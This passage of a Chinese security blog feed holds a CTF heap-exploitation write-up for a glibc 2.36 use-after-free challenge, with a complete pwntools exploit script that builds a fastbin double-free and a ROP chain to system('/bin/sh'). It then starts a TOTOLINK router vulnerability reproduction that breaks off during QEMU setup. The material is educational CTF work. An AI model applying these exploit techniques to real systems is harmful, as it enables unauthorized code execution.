class=\"number\">0x0000000064646464</span>      <span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t 0x0000000560399e28 ^  0x00005606f9db1a78 &#x3D; 0x560399e28450</p>\n<ul>\n<li><p><code>fastbin</code> 堆指针异或加密（<code>glibc-2.32</code> 引入）</p>\n<p><a href=\"http://www.suphp.cn/anquanke/86/236186.html\">http://www.suphp.cn/anquanke/86/236186.html</a></p>\n</li>\n</ul>\n<p>需要泄露两次,两个相邻的fastbin,泄露它们fd位置的值,然后异或就得到了前面那个fastbin的地址了</p>\n<p><a href=\"https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2\">https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2</a></p>\n<h2 id=\"泄露栈地址\"><a href=\"#泄露栈地址\" class=\"headerlink\" title=\"泄露栈地址\"></a>泄露栈地址</h2><p>​\t\t为什么bk这里存储着栈地址呢?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517124416111.png\" alt=\"image-20230517124416111\"></p>\n<p>​\t\t是在add的时候,放入的地址???</p>\n<p>奇怪..一步一步调试的话,栈上数据就没有..不然就有…</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517135521634.png\" alt=\"image-20230517135521634\"></p>\n<h2 id=\"构造double-free链-任意地址写\"><a href=\"#构造double-free链-任意地址写\" class=\"headerlink\" title=\"构造double free链,任意地址写\"></a>构造double free链,任意地址写</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">.........</span><br><span class=\"line\">delte(<span class=\"number\">9</span>)</span><br><span class=\"line\">........</span><br><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">## 构成环了</span></span><br><span class=\"line\"></span><br><span class=\"line\">victim=stack_addr-<span class=\"number\">0x20</span> <span class=\"comment\">## </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(victim))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):            <span class=\"comment\">## 先使用tcachebin</span></span><br><span class=\"line\">    add(i+<span class=\"number\">1</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">pay1=p64(sec^victim)</span><br><span class=\"line\">add(<span class=\"number\">12</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)      <span class=\"comment\">## 三个fastbin</span></span><br><span class=\"line\">add(<span class=\"number\">13</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">14</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">15</span>,<span class=\"string\">b&#x27;ccc&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">15</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tvictim就是要写入的地址,因为有异或机制,所以要和sec异或一下,再写入</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517140406404.png\" alt=\"image-20230517140406404\"></p>\n<p>​\t\t为什么添加完三个fastbin,又会多了tcachebin…\t斯….和tcachebin的机制有关…在分配第一个fastbin的时候,就给他们放到tcachebin中了…</p>\n<h2 id=\"栈地址怎么来的\"><a href=\"#栈地址怎么来的\" class=\"headerlink\" title=\"栈地址怎么来的?\"></a>栈地址怎么来的?</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">15</span>,b<span class=\"number\">&#x27;</span>ccc<span class=\"number\">&#x27;</span>,<span class=\"number\">0x8</span>,b<span class=\"number\">&#x27;</span>\\x00<span class=\"number\">&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">15</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">pie_base_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,b<span class=\"number\">&#x27;</span>\\x00<span class=\"number\">&#x27;</span>))<span class=\"number\">-0x1794</span></span><br><span class=\"line\">print(<span class=\"string\">&#x27;pie: &#x27;</span>+hex(pie_base_addr))</span><br><span class=\"line\">print(hex(stack_addr))</span><br></pre></td></tr></table></figure>\n\n<p>-0x1794要根据具体版本变化,vmmap看到基址, 两个一减就得到了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152151353.png\" alt=\"image-20230517152151353\"></p>\n<p>​\t这个地址是怎么来的呢?</p>\n<p>找不到是谁打印出的pie: 0x55b9c409d794…</p>\n<p>find 0x7ffc27616000 to 0x7ffc27805000,0x55b9c409d794</p>\n<p>​\t下断点到show函数,一步步查看</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517151004919.png\" alt=\"image-20230517151004919\"></p>\n<p>​\t\t是在这里打印出来的,可是为什么这里会存储着这个地址呢??</p>\n<p>​\t\t在add中malloc分配空间的时候会分配到这附近..</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517151632379.png\" alt=\"image-20230517151632379\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152033215.png\" alt=\"image-20230517152033215\"></p>\n<h2 id=\"glibc地址获取\"><a href=\"#glibc地址获取\" class=\"headerlink\" title=\"glibc地址获取\"></a>glibc地址获取</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">30</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>,<span class=\"number\">0x3f8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">31</span>)</span><br><span class=\"line\">show(<span class=\"number\">31</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name: &#x27;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">lib_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">96</span>-<span class=\"number\">0x1f6c60</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;libc: &#x27;</span>+<span class=\"built_in\">hex</span>(lib_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t分配的0x3f8再加上33 还是啥,大小肯定超了tcache的了,就直接进入unsortedbin,然后可以从这里泄露glibc的地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152943496.png\" alt=\"image-20230517152943496\"></p>\n<p>​\t\t-96  再减去和glibc开头的差值,就可以得到glibc加载基址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517153205330.png\" alt=\"image-20230517153205330\"></p>\n<h2 id=\"构造rop链子\"><a href=\"#构造rop链子\" class=\"headerlink\" title=\"构造rop链子\"></a>构造rop链子</h2><p>​\t\t这里直接覆盖的返回地址,exit退出,就会进入rop链</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">system=lib_addr+libc.sym[<span class=\"string\">&quot;system&quot;</span>] <span class=\"comment\">#0x4c330</span></span><br><span class=\"line\">bin_sh=lib_addr+<span class=\"number\">0x1b61b4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(bin_sh))</span><br><span class=\"line\"></span><br><span class=\"line\">ret=<span class=\"number\">0x00000000000233d1</span>+lib_addr</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x00023b65</span>+lib_addr</span><br><span class=\"line\">rop_chain=p64(ret)*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"><span class=\"comment\">## edit</span></span><br><span class=\"line\">edit(<span class=\"number\">15</span>,rop_chain)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">index, name, size,content</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;Name: &#x27;</span>, name)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Description size: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;Description: &#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index, content</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Description: &#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">## 观察怎么泄露的地址</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;test&#x27;</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;ddd&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">recv = p.recv(<span class=\"number\">0xe</span>)</span><br><span class=\"line\">fake_stack_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(fake_stack_addr))</span><br><span class=\"line\">fake_lib_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(fake_lib_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">1</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">11</span>,<span class=\"string\">b&#x27;ddd&#x27;</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    delete(i+<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)</span><br><span class=\"line\">show(<span class=\"number\">9</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">heap_sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">heap_addr=heap_sec^sec</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">stack_addr=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">victim=stack_addr-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(victim))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">1</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">pay1=p64(sec^victim)</span><br><span class=\"line\">add(<span class=\"number\">12</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">13</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">14</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">15</span>,<span class=\"string\">b&#x27;ccc&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">15</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">pie_base_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x1794</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;pie: &#x27;</span>+<span class=\"built_in\">hex</span>(pie_base_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">30</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>,<span class=\"number\">0x3f8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">31</span>)</span><br><span class=\"line\">show(<span class=\"number\">31</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name: &#x27;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">lib_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">96</span>-<span class=\"number\">0x1f6c60</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;libc: &#x27;</span>+<span class=\"built_in\">hex</span>(lib_addr))</span><br><span class=\"line\"><span class=\"comment\">#print(p.bases)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">system=lib_addr+libc.sym[<span class=\"string\">&quot;system&quot;</span>] <span class=\"comment\">#0x4c330</span></span><br><span class=\"line\">bin_sh=lib_addr+<span class=\"number\">0x1b61b4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(bin_sh))</span><br><span class=\"line\"></span><br><span class=\"line\">ret=<span class=\"number\">0x00000000000233d1</span>+lib_addr</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x00023b65</span>+lib_addr</span><br><span class=\"line\">rop_chain=p64(ret)*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"><span class=\"comment\">## edit</span></span><br><span class=\"line\">edit(<span class=\"number\">15</span>,rop_chain)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/",
            "url": "https://tangzichengcc.github.io/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/",
            "title": "totolinkT10路由器老版本漏洞复现和分析",
            "date_published": "2023-05-15T11:01:15.000Z",
            "content_html": "<p>文章同步于:<a href=\"https://mp.weixin.qq.com/s/6kC02ABzeBnhjPeAs6lyrQ\">https://mp.weixin.qq.com/s/6kC02ABzeBnhjPeAs6lyrQ</a></p>\n<p>[toc]</p>\n<h1 id=\"一、环境搭建\"><a href=\"#一、环境搭建\" class=\"headerlink\" title=\"一、环境搭建\"></a>一、环境搭建</h1><h2 id=\"1-1-获取和解压固件\"><a href=\"#1-1-获取和解压固件\" class=\"headerlink\" title=\"1.1 获取和解压固件\"></a>1.1 获取和解压固件</h2><p><a href=\"http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=15&amp;ids=36\">http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=15&amp;ids=36</a></p>\n<p> binwalk -Me TOTOLINK_CS185R_T10_IP04336_8197F_SPI_16M64M_V5.9c.1485_B20180122_ALL.web</p>\n<p>查看busybox获得架构信息, </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:/tmp/squashfs-root/bin<span class=\"meta\"># file busybox</span></span><br><span class=\"line\">busybox: ELF <span class=\"number\">32</span>-bit LSB executable, MIPS, MIPS32 rel2 version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so<span class=\"number\">.0</span>, no section header</span><br></pre></td></tr></table></figure>\n\n\n\n<p>下载qemu</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install qemu-user qemu-user-<span class=\"type\">static</span> qemu-system</span><br><span class=\"line\">    </span><br><span class=\"line\">网桥工具</span><br><span class=\"line\">apt install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>\n\n<p>链接失效了,问同学要了一个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"comment\">//people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span></span><br></pre></td></tr></table></figure>\n\n<p>scp -r root@xxxx:&#x2F;root&#x2F;qemu&#x2F;mipsel&#x2F;debian_wheezy_mipsel_standard.qcow2 .&#x2F;</p>\n<p>scp -r root@xxxx:&#x2F;root&#x2F;qemu&#x2F;mipsel&#x2F;vmlinux-3.2.0-4-4kc-malta .&#x2F;</p>\n<p>网络配置</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brctl addbr virbr2 # 创建网桥</span><br><span class=\"line\">ifconfig virbr2 <span class=\"number\">192.168</span><span class=\"number\">.6</span><span class=\"number\">.1</span>/<span class=\"number\">24</span> up # 配置网桥IP</span><br><span class=\"line\">tunctl -t tap2 # 添加虚拟网卡tap2</span><br><span class=\"line\">ifconfig tap2 <span class=\"number\">192.168</span><span class=\"number\">.6</span><span class=\"number\">.11</span>/<span class=\"number\">24</span> up # 配置虚拟网卡IP</span><br><span class=\"line\">brctl addif virbr2 tap2 # 配置虚拟网卡与网桥连接</span><br></pre></td></tr></table></figure>\n\n\n\n<p>启动虚拟机</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-mipsel -M malta -kernel vmlinux<span class=\"number\">-3.2</span><span class=\"number\">.0</span><span class=\"number\">-4</span><span class=\"number\">-4</span>kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span class=\"string\">&quot;root=/dev/sda1&quot;</span> -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>\n\n\n\n<p>登陆虚拟机、配置网络</p>\n<p>root&#x2F;root</p>\n<p>ifconfig eth0 192.168.6.15 up # 配置路由器IP<br>scp -r squashfs-root&#x2F; <a 